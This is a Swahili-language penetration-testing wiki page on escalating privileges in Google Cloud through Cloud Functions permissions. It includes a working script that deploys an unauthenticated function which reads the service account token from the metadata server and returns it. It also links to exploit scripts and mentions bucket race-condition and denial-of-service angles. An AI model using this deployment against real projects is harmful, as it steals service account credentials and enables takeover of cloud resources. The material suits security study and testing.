# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Taarifa zaidi kuhusu Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Mshambuliaji mwenye ruhusa hizi anaweza **kuunda Cloud Function mpya yenye msimbo (mbaya) wa kiholela na kupewa Akaunti ya Huduma**. Kisha, vuja tokeni ya Akaunti ya Huduma kutoka kwenye metadata ili kupandisha ruhusa kwake.\
Ruhusa zingine za kuanzisha kazi hiyo zinaweza kuhitajika.

Mifano ya skripti za kutumia mbinu hii inaweza kupatikana [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) na [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) na faili ya .zip iliyojengwa tayari inaweza kupatikana [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Mshambuliaji mwenye ruhusa hizi anaweza **kubadilisha msimbo wa Kazi na hata kubadilisha akaunti ya huduma iliyounganishwa** kwa lengo la kutoa tokeni.

> [!CAUTION]
> Ili kupeleka kazi za wingu, pia utahitaji ruhusa za actAs juu ya akaunti ya huduma ya kawaida ya kompyuta au juu ya akaunti ya huduma inayotumika kujenga picha.

Ruhusa za ziada kama ruhusa ya `.call` kwa toleo la 1 la cloudfunctions au jukumu `role/run.invoker` ili kuanzisha kazi hiyo zinaweza kuhitajika.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> Ikiwa unapata kosa `Permission 'run.services.setIamPolicy' denied on resource...` ni kwa sababu unatumia param `--allow-unauthenticated` na huna ruhusa za kutosha kwa hiyo.

Script ya exploit kwa njia hii inaweza kupatikana [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Kwa ruhusa hii unaweza kupata **URL iliyo saini ili uweze kupakia faili kwenye mfuko wa kazi (lakini msimbo wa kazi hautabadilishwa, bado unahitaji kuisasisha)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Sijui jinsi ruhusa hii pekee inavyoweza kuwa na manufaa kutoka kwa mtazamo wa mshambuliaji, lakini ni vizuri kujua.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Jipe ruhusa yoyote kati ya **`.update`** au **`.create`** zilizotangulia ili kupandisha hadhi.

### `cloudfunctions.functions.update`

Kuwa na ruhusa za **`cloudfunctions`** pekee, bila **`iam.serviceAccounts.actAs`** huwezi **kusaidia kusasisha kazi HII SI RUHUSA HALALI YA KUPANDISHA HADHI.**

### Upatikanaji wa Kusoma na Kuandika juu ya ndoo

Ikiwa una upatikanaji wa kusoma na kuandika juu ya ndoo unaweza kufuatilia mabadiliko katika msimbo na wakati wowote **sasisho katika ndoo linapotokea unaweza kusasisha msimbo mpya na msimbo wako** ambao toleo jipya la Cloud Function litakimbia na msimbo wa nyuma uliowasilishwa.

Unaweza kuangalia zaidi kuhusu shambulio katika:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Hata hivyo, huwezi kutumia hii kujiandaa kabla ya kuathiri Cloud Functions za watu wengine kwa sababu ikiwa utaunda ndoo katika akaunti yako na kuipa ruhusa za umma ili mradi wa nje uweze kuandika juu yake, unapata kosa lifuatalo:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Hata hivyo, hii inaweza kutumika kwa shambulio la DoS.

### Upatikanaji wa Kusoma na Kuandika juu ya Katalogi ya Vitu

Wakati Cloud Function inaundwa, picha mpya ya docker inasukumwa kwenye Katalogi ya Vitu ya mradi. Nilijaribu kubadilisha picha hiyo na picha mpya, na hata kufuta picha ya sasa (na picha ya `cache`) na hakuna kilichobadilika, kazi ya wingu inaendelea kufanya kazi. Kwa hivyo, labda **inaweza kuwa na uwezekano wa kutumia shambulio la Race Condition** kama ilivyo na ndoo kubadilisha kontena la docker ambalo litakimbia lakini **kubadilisha picha iliyohifadhiwa si rahisi kuathiri Cloud Function.**

## Marejeleo

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
